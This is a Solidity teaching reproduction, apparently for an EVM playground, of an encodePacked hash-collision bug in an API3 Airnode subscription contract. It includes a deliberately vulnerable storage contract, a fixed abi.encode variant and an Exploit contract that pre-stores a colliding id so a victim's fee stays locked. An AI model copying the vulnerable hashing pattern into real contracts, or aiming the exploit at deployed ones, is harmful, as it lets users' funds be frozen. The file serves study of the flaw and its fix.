// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  API3 Airnode PSP — storeSubscription encodePacked collision (Trail of Bits, API3, Mar 2022)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: subscriptionId is keccak256(abi.encodePacked(... parameters, conditions ...)).
    parameters and conditions are both dynamic, so moving the last byte of parameters onto
    conditions keeps the same id. Eve stores that id first. Alice's publish of the honest
    bytes reverts "Subscription already stored" and her 1000 API3 fee stays in the contract.
    abi.encode separates the two byte strings, so the same publish succeeds. */

contract FeeToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        name = "API3";
        symbol = "API3";
        decimals = 18;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PspStorage {
    struct Subscription {
        uint256 chainId;
        address airnode;
        bytes32 templateId;
        address relayer;
        address sponsor;
        address requester;
        bytes4 fulfillFunctionId;
    }

    uint256 public constant FEE = 1000 ether;

    FeeToken public token;
    uint256 public chainId;
    address public airnode;
    bytes32 public templateId;
    address public relayer;
    address public sponsor;
    bytes4 public fulfillFunctionId;

    mapping(bytes32 => Subscription) public subscriptions;
    mapping(bytes32 => bytes) public storedParameters;
    mapping(bytes32 => bytes) public storedConditions;
    mapping(address => uint256) public pending;
    mapping(address => bytes32) public active;

    constructor(FeeToken token_) {
        token = token_;
        chainId = 1;
        airnode = address(uint160(0xA11CE));
        templateId = bytes32(uint256(7));
        relayer = address(uint160(0xA1));
        sponsor = address(uint160(0xB2));
        fulfillFunctionId = 0x12345678;
    }

    function deposit(uint256 amount) external {
        require(amount == FEE, "fee");
        token.transferFrom(msg.sender, address(this), amount);
        pending[msg.sender] += amount;
    }

    function storeSubscription(
        uint256 chainId_,
        address airnode_,
        bytes32 templateId_,
        bytes calldata parameters,
        bytes calldata conditions,
        address relayer_,
        address sponsor_,
        address requester,
        bytes4 fulfillFunctionId_
    ) external returns (bytes32 subscriptionId) {
        require(chainId_ != 0, "Chain ID zero");
        require(airnode_ != address(0), "Airnode address zero");
        require(relayer_ != address(0), "Relayer address zero");
        require(sponsor_ != address(0), "Sponsor address zero");
        require(requester != address(0), "Requester address zero");
        require(fulfillFunctionId_ != bytes4(0), "Fulfill function ID zero");
        // @> VULN: encodePacked of two dynamic byte strings collides when a byte moves from parameters into conditions
        subscriptionId = keccak256(
            abi.encodePacked(
                chainId_,
                airnode_,
                templateId_,
                parameters,
                conditions,
                relayer_,
                sponsor_,
                requester,
                fulfillFunctionId_
            )
        );
        subscriptions[subscriptionId] = Subscription({
            chainId: chainId_,
            airnode: airnode_,
            templateId: templateId_,
            relayer: relayer_,
            sponsor: sponsor_,
            requester: requester,
            fulfillFunctionId: fulfillFunctionId_
        });
        storedParameters[subscriptionId] = parameters;
        storedConditions[subscriptionId] = conditions;
    }

    function publish(bytes calldata parameters, bytes calldata conditions) external returns (bytes32 subscriptionId) {
        require(pending[msg.sender] >= FEE, "fee");
        subscriptionId = keccak256(
            abi.encodePacked(
                chainId,
                airnode,
                templateId,
                parameters,
                conditions,
                relayer,
                sponsor,
                msg.sender,
                fulfillFunctionId
            )
        );
        require(subscriptions[subscriptionId].airnode == address(0), "Subscription already stored");
        pending[msg.sender] -= FEE;
        active[msg.sender] = subscriptionId;
    }

    function publishEncoded(bytes calldata parameters, bytes calldata conditions) external returns (bytes32 subscriptionId) {
        require(pending[msg.sender] >= FEE, "fee");
        // FIX: abi.encode length-prefixes each dynamic field, so the shifted byte is a different id
        subscriptionId = keccak256(
            abi.encode(
                chainId,
                airnode,
                templateId,
                parameters,
                conditions,
                relayer,
                sponsor,
                msg.sender,
                fulfillFunctionId
            )
        );
        require(subscriptions[subscriptionId].airnode == address(0), "Subscription already stored");
        subscriptions[subscriptionId] = Subscription({
            chainId: chainId,
            airnode: airnode,
            templateId: templateId,
            relayer: relayer,
            sponsor: sponsor,
            requester: msg.sender,
            fulfillFunctionId: fulfillFunctionId
        });
        storedParameters[subscriptionId] = parameters;
        storedConditions[subscriptionId] = conditions;
        pending[msg.sender] -= FEE;
        active[msg.sender] = subscriptionId;
    }

    function packedId(bytes calldata parameters, bytes calldata conditions, address requester) external view returns (bytes32) {
        return keccak256(
            abi.encodePacked(chainId, airnode, templateId, parameters, conditions, relayer, sponsor, requester, fulfillFunctionId)
        );
    }

    function encodedId(bytes calldata parameters, bytes calldata conditions, address requester) external view returns (bytes32) {
        return keccak256(
            abi.encode(chainId, airnode, templateId, parameters, conditions, relayer, sponsor, requester, fulfillFunctionId)
        );
    }
}

contract Subscriber {
    function pullAndDeposit(FeeToken token, PspStorage psp, uint256 amount) external {
        token.approve(address(psp), amount);
        psp.deposit(amount);
    }

    function storeFor(
        PspStorage psp,
        bytes calldata parameters,
        bytes calldata conditions,
        address requester
    ) external returns (bytes32 subscriptionId) {
        subscriptionId = psp.storeSubscription(
            psp.chainId(),
            psp.airnode(),
            psp.templateId(),
            parameters,
            conditions,
            psp.relayer(),
            psp.sponsor(),
            requester,
            psp.fulfillFunctionId()
        );
    }

    function tryPublish(PspStorage psp, bytes calldata parameters, bytes calldata conditions) external returns (bool published) {
        try psp.publish(parameters, conditions) returns (bytes32) {
            published = true;
        } catch {
            published = false;
        }
    }

    function publishEncoded(PspStorage psp, bytes calldata parameters, bytes calldata conditions) external returns (bytes32 subscriptionId) {
        subscriptionId = psp.publishEncoded(parameters, conditions);
    }
}

contract Exploit {
    FeeToken public token; // CREATE nonce 1
    PspStorage public psp; // CREATE nonce 2
    Subscriber public alice; // CREATE nonce 3
    Subscriber public eve; // CREATE nonce 4

    uint256 public stuck;
    bool public publishReverted;
    bytes32 public collidingId;
    bytes32 public encodedAliceId;
    bytes32 public encodedEveId;

    constructor() {
        token = new FeeToken();
        psp = new PspStorage(token);
        alice = new Subscriber();
        eve = new Subscriber();
    }

    function FEE() external pure returns (uint256) {
        return 1000 ether;
    }

    function aliceParameters() public pure returns (bytes memory) {
        return hex"6162";
    }

    function aliceConditions() public pure returns (bytes memory) {
        return hex"63";
    }

    function eveParameters() public pure returns (bytes memory) {
        return hex"61";
    }

    function eveConditions() public pure returns (bytes memory) {
        return hex"6263";
    }

    function run() external {
        uint256 fee = 1000 ether;
        token.mint(address(alice), fee);
        alice.pullAndDeposit(token, psp, fee);
        eve.storeFor(psp, eveParameters(), eveConditions(), address(alice));
        bool published = alice.tryPublish(psp, aliceParameters(), aliceConditions());
        publishReverted = !published;
        stuck = token.balanceOf(address(psp));
        collidingId = psp.packedId(aliceParameters(), aliceConditions(), address(alice));
        encodedAliceId = psp.encodedId(aliceParameters(), aliceConditions(), address(alice));
        encodedEveId = psp.encodedId(eveParameters(), eveConditions(), address(alice));
        require(publishReverted, "publish succeeded");
        require(stuck == fee, "fee not stuck");
        require(psp.pending(address(alice)) == fee, "pending released");
        require(psp.active(address(alice)) == bytes32(0), "subscription active");
        require(collidingId == psp.packedId(eveParameters(), eveConditions(), address(alice)), "no collision");
        require(encodedAliceId != encodedEveId, "encode still collides");
        require(keccak256(psp.storedParameters(collidingId)) == keccak256(eveParameters()), "slot is not the shifted bytes");
        require(keccak256(psp.storedConditions(collidingId)) == keccak256(eveConditions()), "conditions not shifted");
    }
}
